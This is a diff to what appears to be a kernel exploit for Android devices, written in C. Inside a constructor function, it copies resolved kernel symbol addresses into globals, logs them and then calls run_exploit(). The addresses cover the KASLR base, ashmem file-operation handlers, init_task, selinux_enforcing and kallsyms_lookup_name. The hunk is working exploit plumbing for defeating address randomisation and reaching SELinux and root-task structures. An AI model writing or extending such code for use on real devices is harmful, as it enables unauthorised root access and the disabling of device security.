@@ -411,5 +411,32 @@ __attribute__((constructor)) static void load(void) {
   pr_info("robustness phase1 done: version_match=%d kallsyms=%d\n",
           rr.version_match, rr.kallsyms_resolved);
 
+  /* 将动态符号地址复制到全局变量，供 dyn_text_addr/dyn_data_addr 使用 */
+  if (rr.kallsyms_resolved) {
+    g_dyn_kaslr_base = rr.dyn_stext;
+    g_dyn_ashmem_misc_fops = rr.dyn_ashmem_fops;
+    g_dyn_init_task = rr.dyn_init_task;
+    g_dyn_root_task_group = rr.dyn_root_task_group;
+    g_dyn_ashmem_ioctl = rr.dyn_ashmem_ioctl;
+    g_dyn_ashmem_compat_ioctl = rr.dyn_ashmem_compat_ioctl;
+    g_dyn_ashmem_mmap = rr.dyn_ashmem_mmap;
+    g_dyn_ashmem_open = rr.dyn_ashmem_open;
+    g_dyn_ashmem_release = rr.dyn_ashmem_release;
+    g_dyn_ashmem_show_fdinfo = rr.dyn_ashmem_show_fdinfo;
+    g_dyn_configfs_read_iter = rr.dyn_configfs_read_iter;
+    g_dyn_configfs_bin_write_iter = rr.dyn_configfs_bin_write_iter;
+    g_dyn_copy_splice_read = rr.dyn_copy_splice_read;
+    g_dyn_noop_llseek = rr.dyn_noop_llseek;
+    g_dyn_selinux_enforcing = rr.dyn_selinux_enforcing;
+    g_dyn_kallsyms_lookup_name = rr.dyn_kallsyms_lookup_name;
+    g_dyn_symbols_ready = 1;
+    pr_success("dynamic symbols ready: kaslr_base=%016llx ashmem_fops=%016llx init_task=%016llx\n",
+               (unsigned long long)g_dyn_kaslr_base,
+               (unsigned long long)g_dyn_ashmem_misc_fops,
+               (unsigned long long)g_dyn_init_task);
+  } else {
+    pr_warning("kallsyms not resolved, using static offsets (may fail on 203)\n");
+  }
+
   run_exploit(1, argv);
 }
